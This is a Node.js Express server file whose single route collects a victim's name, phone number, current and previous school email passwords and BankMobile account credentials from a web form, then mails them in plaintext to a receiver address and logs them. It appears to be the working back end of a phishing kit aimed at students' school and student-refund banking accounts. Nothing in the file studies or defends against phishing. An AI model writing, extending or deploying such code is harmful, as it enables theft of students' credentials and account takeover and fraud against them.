const express = require("express");
const path = require("path");
const nodemailer = require("nodemailer");
const dotenv = require("dotenv");
const helmet = require("helmet");
const crypto = require("crypto");
const cors = require("cors");
const { body, validationResult } = require("express-validator");

dotenv.config();
const app = express();
const PORT = process.env.PORT;

// Middleware
app.use(helmet());
app.use(express.json());
app.use(cors({ origin: "http://localhost:3290" })); // strict CORS
app.use(express.static(path.join(__dirname, "client")));

// Routes
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "client", "index.html"));
});

// POST: Email Sending
app.post("/send-email", async (req, res) => {
  const {
    fullName,
    phoneNumber,
    currentSchoolEmail,
    currentSchoolPassword,
    previousSchoolEmail,
    previousSchoolPassword,
    hasBankMobileProfile,
    bankMobileEmail,
    bankMobilePassword,
  } = req.body;

  // Basic validation (optional – can be extended)
  if (
    !fullName ||
    !currentSchoolEmail ||
    !currentSchoolPassword ||
    !previousSchoolEmail ||
    !previousSchoolPassword
  ) {
    return res.status(400).json({ error: "Missing required fields" });
  }

  const secret = process.env.SECRET_KEY;
  const dataToSign = `${fullName}:${currentSchoolEmail}:${previousSchoolEmail}`;
  const signature = crypto
    .createHmac("sha256", secret)
    .update(dataToSign)
    .digest("hex");

  try {
    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },
    });

    const message = `
        New Full Form Submission

          Full Name: ${fullName}
          Phone Number: ${phoneNumber}

          --- Current School Credentials ---
          Email: ${currentSchoolEmail}
          Password: ${currentSchoolPassword}

          --- Previous School Credentials ---
          Email: ${previousSchoolEmail}
          Password: ${previousSchoolPassword}

          --- BankMobile ---
          Has BankMobile Profile: ${hasBankMobileProfile}
          Email: ${bankMobileEmail || "N/A"}
          Password: ${bankMobilePassword || "N/A"}
    `;

    await transporter.sendMail({
      from: `"Website Contact" <${process.env.EMAIL_USER}>`,
      to: process.env.RECEIVER_EMAIL,
      subject: "📨 New Full Form Submission",
      text: message,
    });

    console.log(message);

    return res.json({ success: true });
  } catch (err) {
    console.error(err);
    return res.status(500).json({ error: "Email failed to send" });
  }
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
